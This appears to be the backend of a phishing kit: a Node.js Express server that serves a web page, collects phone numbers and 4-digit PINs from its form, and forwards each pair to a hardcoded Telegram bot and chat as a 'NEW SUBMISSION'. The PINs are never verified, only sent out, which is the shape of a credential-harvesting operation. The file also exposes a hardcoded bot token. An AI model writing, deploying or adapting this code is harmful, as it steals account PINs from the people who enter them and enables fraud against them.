const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials - HARDCODED
const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());

// API endpoint - THIS IS WHAT YOUR HTML IS CALLING
app.post('/api/submit', async (req, res) => {
    console.log('✅ API was called!');
    console.log('📦 Data received:', req.body);
    
    const { phoneNumber, pin } = req.body;
    
    // Validation
    if (!phoneNumber || !pin) {
        console.log('❌ Missing data');
        return res.json({ success: false, error: 'Phone and PIN required' });
    }
    
    if (phoneNumber.length !== 10) {
        console.log('❌ Wrong phone length');
        return res.json({ success: false, error: 'Phone must be 10 digits' });
    }
    
    if (pin.length !== 4) {
        console.log('❌ Wrong PIN length');
        return res.json({ success: false, error: 'PIN must be 4 digits' });
    }
    
    // Send to Telegram
    const message = `🔔 NEW SUBMISSION! 🔔\n\n📱 Phone: ${phoneNumber}\n🔐 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    try {
        const result = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        
        console.log('✅ Telegram success!');
        res.json({ success: true });
        
    } catch (error) {
        console.log('❌ Telegram error:', error.message);
        res.json({ success: false, error: 'Telegram failed' });
    }
});

// Serve your HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// ALSO serve the HTML if someone visits /index.html
app.get('/index.html', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(PORT, () => {
    console.log(`🚀 ========================================`);
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 API endpoint: /api/submit`);
    console.log(`🚀 ========================================`);
});
